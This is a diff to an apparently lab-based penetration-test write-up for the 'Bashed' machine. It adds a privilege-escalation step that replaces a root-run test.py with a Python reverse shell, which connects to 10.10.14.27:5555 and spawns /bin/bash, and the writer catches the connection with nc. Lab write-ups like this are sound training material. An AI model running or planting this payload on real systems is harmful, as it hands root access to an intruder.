@@ -209,6 +209,7 @@ On the bashed host we enter this command in the php shell:
 ```
 
 On our host we receive a reverse shell back:
+
 ![ImgPlaceholder](screenshots/reverse-shell.png)
 
 Then we upload a linpeas.sh script and give it execute rights:
@@ -270,6 +271,25 @@ f.close
 ```
 
 We find a test.txt file with root permissions indicating the test.py file is executed with privileged root. We can use this to create a privesc script by replacing/changing the script:
+```
+scriptmanager@bashed:/scripts$ cat test.py
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.27",5555));os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+import pty; 
+pty.spawn("/bin/bash")
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+```
+
+On my box I opened a nc connection on port 5555 and waited for the reverse shell:
+
+![ImgPlaceholder](screenshots/root.png)
+
+
+
 **Vulnerability Fix:**
 
 ## Sample Report - Maintaining Access
